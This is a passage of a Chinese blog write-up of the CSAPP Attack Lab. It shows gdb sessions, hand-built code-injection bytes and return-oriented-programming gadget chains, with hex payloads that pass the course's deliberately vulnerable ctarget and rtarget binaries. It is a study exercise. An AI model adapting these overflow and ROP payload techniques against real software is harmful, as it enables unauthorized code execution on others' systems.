&lt;vlevel&gt;</div><div class="line">   0x0000000000401908 &lt;+14&gt;:    mov    %rdi,%rsi</div><div class="line">   0x000000000040190b &lt;+17&gt;:    mov    0x202bd3(%rip),%edi        # 0x6044e4 &lt;cookie&gt;</div><div class="line">   0x0000000000401911 &lt;+23&gt;:    callq  0x40184c &lt;hexmatch&gt;</div><div class="line">   0x0000000000401916 &lt;+28&gt;:    test   %eax,%eax</div><div class="line">   0x0000000000401918 &lt;+30&gt;:    je     0x40193d &lt;touch3+67&gt;</div><div class="line">   0x000000000040191a &lt;+32&gt;:    mov    %rbx,%rdx</div><div class="line">   0x000000000040191d &lt;+35&gt;:    mov    $0x403138,%esi</div><div class="line">   0x0000000000401922 &lt;+40&gt;:    mov    $0x1,%edi</div><div class="line">   0x0000000000401927 &lt;+45&gt;:    mov    $0x0,%eax</div><div class="line">   0x000000000040192c &lt;+50&gt;:    callq  0x400df0 &lt;__printf_chk@plt&gt;</div><div class="line">   0x0000000000401931 &lt;+55&gt;:    mov    $0x3,%edi</div><div class="line">   0x0000000000401936 &lt;+60&gt;:    callq  0x401c8d &lt;validate&gt;</div><div class="line">   0x000000000040193b &lt;+65&gt;:    jmp    0x40195e &lt;touch3+100&gt;</div><div class="line">   0x000000000040193d &lt;+67&gt;:    mov    %rbx,%rdx</div><div class="line">---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---</div><div class="line">   0x0000000000401940 &lt;+70&gt;:    mov    $0x403160,%esi</div><div class="line">   0x0000000000401945 &lt;+75&gt;:    mov    $0x1,%edi</div><div class="line">   0x000000000040194a &lt;+80&gt;:    mov    $0x0,%eax</div><div class="line">   0x000000000040194f &lt;+85&gt;:    callq  0x400df0 &lt;__printf_chk@plt&gt;</div><div class="line">   0x0000000000401954 &lt;+90&gt;:    mov    $0x3,%edi</div><div class="line">   0x0000000000401959 &lt;+95&gt;:    callq  0x401d4f &lt;fail&gt;</div><div class="line">   0x000000000040195e &lt;+100&gt;:   mov    $0x0,%edi</div><div class="line">   0x0000000000401963 &lt;+105&gt;:   callq  0x400e40 &lt;exit@plt&gt;</div><div class="line">End of assembler dump.</div></pre></td></tr></table></figure>
+<p>在0x0000000000401916 &lt;+28&gt;:处设置断点，continue后查看缓冲区数据： </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line">(gdb) break touch3</div><div class="line">Breakpoint 1 at 0x4018fa: file visible.c, line 71.</div><div class="line">(gdb) run</div><div class="line">Starting program: /home/minimips/Desktop/CMU实验_2018/Attack lab/target1/ctarget</div><div class="line">FAILED: Initialization error: Running on an illegal host [minimips-work]</div><div class="line">[Inferior 1 (process 91489) exited with code 010]</div><div class="line">(gdb) run -qi phase3_input.txt</div><div class="line">Starting program: /home/minimips/Desktop/CMU实验_2018/Attack lab/target1/ctarget -qi phase3_input.txt</div><div class="line">Cookie: 0x59b997fa</div><div class="line"></div><div class="line">Breakpoint 1, touch3 (sval=0x606010 &quot;\210$\255&quot;, &lt;incomplete sequence \373&gt;)</div><div class="line">    at visible.c:71</div><div class="line">71      visible.c: No such file or directory.</div><div class="line">(gdb) break *0x40190b</div><div class="line">Breakpoint 2 at 0x40190b: file visible.c, line 73.</div><div class="line">(gdb) break *0x401916</div><div class="line">Breakpoint 3 at 0x401916: file visible.c, line 73.</div><div class="line">(gdb) continue</div><div class="line">Continuing.</div><div class="line"></div><div class="line">Breakpoint 2, 0x000000000040190b in touch3 (</div><div class="line">    sval=0x606010 &quot;\210$\255&quot;, &lt;incomplete sequence \373&gt;) at visible.c:73</div><div class="line">73      in visible.c</div><div class="line"> (gdb) x/20x 0x5561dc78 # 在调用hexmatch之前缓冲区不变</div><div class="line">0x5561dc78:     0x4018fa68      0x0000c300      0x00000000      0x00000000</div><div class="line">0x5561dc88:     0x00000000      0x00000000      0x00000000      0x00000000</div><div class="line">0x5561dc98:     0x00000000      0x00000000      0x55586000      0x00000000</div><div class="line">0x5561dca8:     0x00000009      0x00000000      0x00401f24      0x00000000</div><div class="line">0x5561dcb8:     0x00000000      0x00000000      0xf4f4f4f4      0xf4f4f4f4</div><div class="line">(gdb) continue</div><div class="line">Continuing.</div><div class="line"></div><div class="line">Breakpoint 3, 0x0000000000401916 in touch3 (</div><div class="line">    sval=0x606010 &quot;\210$\255&quot;, &lt;incomplete sequence \373&gt;) at visible.c:73</div><div class="line">73      in visible.c</div><div class="line">(gdb) x/20x 0x5561dc78 # 在调用hexmatch之后缓冲区发生改变</div><div class="line">0x5561dc78:     0x6dc03400      0x181c2db5      0x00606010      0x00000000</div><div class="line">0x5561dc88:     0x55685fe8      0x00000000      0x00000003      0x00000000</div><div class="line">0x5561dc98:     0x00401916      0x00000000      0x55586000      0x00000000</div><div class="line">0x5561dca8:     0x00000009      0x00000000      0x00401f24      0x00000000</div><div class="line">0x5561dcb8:     0x00000000      0x00000000      0xf4f4f4f4      0xf4f4f4f4</div></pre></td></tr></table></figure>
+<p>观察发现缓冲区被覆盖了，所以不能把Cookie的ASCII码放在缓冲区开头，可以放在0x5561dca8处的0x00401f24之后，有足够的空间存放，最终phase3.txt如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">48 c7 c7 fa 97 b9 59 68 </div><div class="line">fa 18 40 00 c3 00 00 00 </div><div class="line">00 00 00 00 00 00 00 00 </div><div class="line">00 00 00 00 00 00 00 00 </div><div class="line">35 39 62 39 39 37 66 61 </div><div class="line">78 dc 61 55 00 00 00 00 </div><div class="line">09 00 00 00 00 00 00 00 </div><div class="line">24 1f 40 00 00 00 00 00 </div><div class="line">35 39 62 39 39 37 66 61</div></pre></td></tr></table></figure>
+<p>使用如下命令测试，同时查看结果： </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">./hex2raw &lt; phase3.txt &gt; phase3_input.txt</div><div class="line">./ctarget -qi phase3_input.txt</div><div class="line">Cookie: 0x59b997fa</div><div class="line">Touch3!: You called touch3(&quot;59b997fa&quot;)</div><div class="line">Valid solution for level 3 with target ctarget</div><div class="line">PASS: Would have posted the following:</div><div class="line">        user id bovik</div><div class="line">        course  15213-f15</div><div class="line">        lab     attacklab</div><div class="line">        result  1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 3030 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61</div></pre></td></tr></table></figure>
+<p>Level 3通过。 </p>
+<h2 id="Part-II-Return-Oriented-Programming"><a href="#Part-II-Return-Oriented-Programming" class="headerlink" title="Part II: Return-Oriented Programming"></a>Part II: Return-Oriented Programming</h2><p>这一部分攻击rtarget程序，但是这个程序使用了两种技术防止代码注入攻击：</p>
+<ul>
+<li>每次栈的位置是随机的，于是我们没有办法确定需要跳转的地址</li>
+<li>即使我们能够找到规律注入代码，但是栈是不可执行的，一旦执行，则会遇到段错误</li>
+</ul>
+<p>所以只能利用已有的可执行的代码，来完成我们的操作，称为<code>retrun-oriented programming(ROP)</code>，策略就是找到现存代码中的若干条指令，这些指令后面跟着指令ret，每次return相当于从一个gadget跳转到另一个gadget中，然后通过这样不断跳转来完成我们想要的操作。</p>
+<h3 id="Level-1-1"><a href="#Level-1-1" class="headerlink" title="Level 1"></a>Level 1</h3><p>这一关要求我们重复上一部分Level 2的攻击，但是无法对rtarget进行代码注入攻击，我们只能使用ROP攻击：利用farm.c中的程序的gadget，构造我们需要的指令，在rtarget中执行，farm段的反汇编代码在下面这一部分：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">0000000000401994 &lt;start_farm&gt;:</div><div class="line">  401994:	b8 01 00 00 00       	mov    $0x1,%eax</div><div class="line">  401999:	c3                   	retq   </div><div class="line">……</div><div class="line">0000000000401ab2 &lt;end_farm&gt;:</div><div class="line">  401ab2:	b8 01 00 00 00       	mov    $0x1,%eax</div><div class="line">  401ab7:	c3                   	retq   </div><div class="line">  401ab8:	90                   	nop</div><div class="line">  401ab9:	90                   	nop</div><div class="line">  401aba:	90                   	nop</div><div class="line">  401abb:	90                   	nop</div><div class="line">  401abc:	90                   	nop</div><div class="line">  401abd:	90                   	nop</div><div class="line">  401abe:	90                   	nop</div><div class="line">  401abf:	90                   	nop</div></pre></td></tr></table></figure>
+<p>使用如下几个gadget构造ROP程序： </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">00000000004019a0 &lt;addval_273&gt;:</div><div class="line">  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax</div><div class="line">  4019a6:	c3                   	retq   </div><div class="line"></div><div class="line">00000000004019a7 &lt;addval_219&gt;:</div><div class="line">  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax</div><div class="line">  4019ad:	c3                   	retq</div></pre></td></tr></table></figure>
+<p>使用如下地址： </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">0x004017ec # touch2 的入口地址</div><div class="line">0x004019a2 # 48 89 c7 movq %rax, %rdi</div><div class="line">0x59b997fa # My cookie</div><div class="line">0x004019ab # popq %rax</div></pre></td></tr></table></figure>
+<p>构造成的phase4.txt如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</div><div class="line">ab 19 40 00 00 00 00 00 fa 97 b9 59 00 00 00 00 </div><div class="line">c5 19 40 00 00 00 00 00 ec 17 40 00 00 00 00 00</div></pre></td></tr></table></figure>
+<p>使用如下命令测试，同时查看结果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">./hex2raw &lt; phase4.txt &gt; phase4_input.txt</div><div class="line">./rtarget -qi phase4_input.txt</div><div class="line">Cookie: 0x59b997fa</div><div class="line">Touch2!: You called touch2(0x59b997fa)</div><div class="line">Valid solution for level 2 with target rtarget</div><div class="line">PASS: Would have posted the following:</div><div class="line">        user id bovik</div><div class="line">        course  15213-f15</div><div class="line">        lab     attacklab</div><div class="line">        result  1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 C5 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00</div></pre></td></tr></table></figure>
+<p>Level 1通过。</p>
+<h3 id="Level-2-1"><a href="#Level-2-1" class="headerlink" title="Level 2"></a>Level 2</h3><p>这一关要求我们重复上一部分Level 3的攻击，使用ROP攻击的形式。</p>
+<p>使用如下几个gadget构造ROP程序：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">0000000000401aab &lt;setval_350&gt;:</div><div class="line">  401aab:	c7 07 48 89 e0 90    	movl   $0x90e08948,(%rdi)</div><div class="line">  401ab1:	c3                   	retq   </div><div class="line"></div><div class="line">00000000004019d6 &lt;add_xy&gt;:</div><div class="line">  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax</div><div class="line">  4019da:	c3                   	retq   </div><div class="line"></div><div class="line">00000000004019a0 &lt;addval_273&gt;:</div><div class="line">  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax</div><div class="line">  4019a6:	c3                   	retq</div></pre></td></tr></table></figure>
+<p>使用如下地址： </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">0x00401aad # 48 89 e0 movq %rsp, %rax</div><div class="line">0x004019d8 # 04 37 add %0x37, %al</div><div class="line">0x004019a2 # 48 89 c7 movq %rax, %rdi</div><div class="line">0x004018fa # touch2 的入口地址</div><div class="line">35 39 62 39 39 37 66 61 00 # My cookie ASCII</div></pre></td></tr></table></figure>
+<p>构造成的phase5.txt如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</div><div class="line">ad 1a 40 00 00 00 00 00 d8 19 40 00 00 00 00 00  </div><div class="line">a2 19 40 00 00 00 00 00 fa 18 40 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 00 00 00 35 39 62 39 39 37 66 61 00</div></pre></td></tr></table></figure>
+<p>使用如下命令测试，同时查看结果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">./hex2raw &lt; phase5.txt &gt; phase5_input.txt</div><div class="line">./rtarget -qi phase5_input.txt</div><div class="line">Cookie: 0x59b997fa</div><div class="line">Touch3!: You called touch3(&quot;59b997fa&quot;)</div><div class="line">Valid solution for level 3 with target rtarget</div><div class="line">PASS: Would have posted the following:</div><div class="line">        user id bovik</div><div class="line">        course  15213-f15</div><div class="line">        lab     attacklab</div><div class="line">        result  1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AD 1A 40 00 00 00 00 00 D8 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 35 39 62 39 39 37 66 61 00</div></pre></td></tr></table></figure>
+<p>Level 2通过。</p>
+      
+    </div>
+
+    <div>
+      
+        
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/C-C/" rel="tag">#C/C++</a>
+          
+            <a href="/tags/CSAPP/" rel="tag">#CSAPP</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/04/26/bomblab/" rel="next" title="深入理解计算机系统（CSAPP）实验二 Bomb Lab">
+                <i class="fa fa-chevron-left"></i> 深入理解计算机系统（CSAPP）实验二 Bomb Lab
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/06/12/calculator/" rel="prev" title="Calculator实现文档">
+                Calculator实现文档 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div class="ds-thread" data-thread-key="2018/05/10/attacklab/" data-title="深入理解计算机系统（CSAPP）实验三 Attack Lab" data-url="http://xzjqx.data/2018/05/10/attacklab/">
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image" src="/images/default_avatar.jpg" alt="xzjqx">
+          <p class="site-author-name" itemprop="name">xzjqx</p>
+          <p class="site-description motion-element" itemprop="description"></p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">23</span>
+              <span class="site-state-item-name">日志</span>
+            </a>
+          </div>
+
+          
+            <div class="site-state-item site-state-categories">
+              <a href="/categories">
+                <span class="site-state-item-count">5</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">21</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+          <div class="site-state-item site-state-posts">
+            <span class="site-state-item-count">43.3k</span>
+            <span class="site-state-item-name">字数</span>
+          </div>
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/xzjqx" target="_blank">
+                  
+                    <i class="fa fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        <div class="links-of-blogroll motion-element">
+          
+            <div class="links-of-blogroll-title">Links</div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://www.shintaku.cc/" target="_blank">Shintaku</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://gggjiji.github.io/" target="_blank">GGGjiji</a>
+                </li>
+              
+            </ul>
+          
+          <!--
+          </br>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+            您是xzjqx的第<span id="busuanzi_value_site_uv"></span>个小伙伴
+          </span>
+          -->
+        </div>
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#准备工作"><span class="nav-number">1.</span> <span class="nav-text">准备工作</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Part-I-Code-Injection-Attacks"><span class="nav-number">2.</span> <span class="nav-text">Part I: Code Injection Attacks</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Level-1"><span class="nav-number">2.1.</span> <span class="nav-text">Level 1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Level-2"><span class="nav-number">2.2.</span> <span class="nav-text">Level 2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Level-3"><span class="nav-number">2.3.</span> <span class="nav-text">Level 3</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Part-II-Return-Oriented-Programming"><span class="nav-number">3.</span> <span class="nav-text">Part II: Return-Oriented Programming</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Level-1-1"><span class="nav-number">3.1.</span> <span class="nav-text">Level 1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Level-2-1"><span class="nav-number">3.2.</span> <span class="nav-text">Level 2</span></a></li></ol></li></ol></div>
+            
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">
+  
+  &copy;  2015 - 
+  <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <a href="http://www.xzjqx.date">xzjqx's blog</a>
+</div>
+
+<div class="powered-by">
+  由 <a class="theme-link" href="http://hexo.io" rel="external nofollow">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next" rel="external nofollow">
+    NexT.Mist
+  </a>
+</div>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+
+  
+
+
+
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
+
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>
+
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=0.5.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=0.5.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=0.5.0"></script>
+<script type="text/javascript" src="/vendors/jquery-scrollintoview/jquery.scrollintoview.min.js?v=0.5.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=0.5.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=0.5.0"></script>
+
+
+
+  
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"xzjqx"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.id = 'duoshuo-script';
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+
+  
+    
+  
+
+
+
+
+
+  
+  
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length == 0) {
+       search_path = "search.xml";
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    function proceedsearch() {
+      $("body").append('<div class="popoverlay">').css('overflow', 'hidden');
+      $('.popup').toggle();
+
+    }
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+    'use strict';
+    $.ajax({
+        url: path,
+        dataType: "xml",
+        async: true,
+        success: function( xmlResponse ) {
+            // get the contents from search data
+            isfetched = true;
+            $('.popup').detach().appendTo('.header-inner');
+            var datas = $( "entry", xmlResponse ).map(function() {
+                return {
+                    title: $( "title", this ).text(),
+                    content: $("content",this).text(),
+                    url: $( "url" , this).text()
+                };
+            }).get();
+            var $input = document.getElementById(search_id);
+            var $resultContent = document.getElementById(content_id);
+            $input.addEventListener('input', function(){
+                var matchcounts = 0;
+                var str='<ul class=\"search-result-list\">';                
+                var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                $resultContent.innerHTML = "";
+                if (this.value.trim().length > 1) {
+                // perform local searching
+                datas.forEach(function(data) {
+                    var isMatch = true;
+                    var content_index = [];
+                    var data_title = data.title.trim().toLowerCase();
+                    var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
+                    var data_url = data.url;
+                    var index_title = -1;
+                    var index_content = -1;
+                    var first_occur = -1;
+                    // only match artiles with not empty titles and contents
+                    if(data_title != '' && data_content != '') {
+                        keywords.forEach(function(keyword, i) {
+                            index_title = data_title.indexOf(keyword);
+                            index_content = data_content.indexOf(keyword);
+                            if( index_title < 0 && index_content < 0 ){
+                                isMatch = false;
+                            } else {
+                                if (index_content < 0) {
+                                    index_content = 0;
+                                }
+                                if (i == 0) {
+                                    first_occur = index_content;
+                                }
+                            }
+                        });
+                    }
+                    // show search results
+                    if (isMatch) {
+                        matchcounts += 1;
+                        str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
+                        var content = data.content.trim().replace(/<[^>]+>/g,"");
+                        if (first_occur >= 0) {
+                            // cut out 100 characters
+                            var start = first_occur - 20;
+                            var end = first_occur + 80;
+                            if(start < 0){
+                                start = 0;
+                            }
+                            if(start == 0){
+                                end = 50;
+                            }
+                            if(end > content.length){
+                                end = content.length;
+                            }
+                            var match_content = content.substring(start, end);
+                            // highlight all keywords
+                            keywords.forEach(function(keyword){
+                                var regS = new RegExp(keyword, "gi");
+                                match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
+                            });
+                            
+                            str += "<p class=\"search-result\">" + match_content +"...</p>"
+                        }
+                        str += "</li>";
+                    }
+                })};
+                str += "</ul>";
+                if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
+                if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
+                $resultContent.innerHTML = str;
+            });
+            proceedsearch();
+        }
+    });}
+
+    // handle and trigger popup window;
+    $('.popup-trigger').mousedown(function(e) {
+      e.stopPropagation();
+      if (isfetched == false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+
+    });
+
+    $('.popup-btn-close').click(function(e){
+      $('.popup').hide();
+      $(".popoverlay").remove();
+      $('body').css('overflow', '');
+    });
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+  </script>
+
+  
+
+  
+
+  
+<script type="text/javascript" async src="//push.zhanzhang.baidu.com/push.js">
+</script>
+
+
+</body>
+</html>
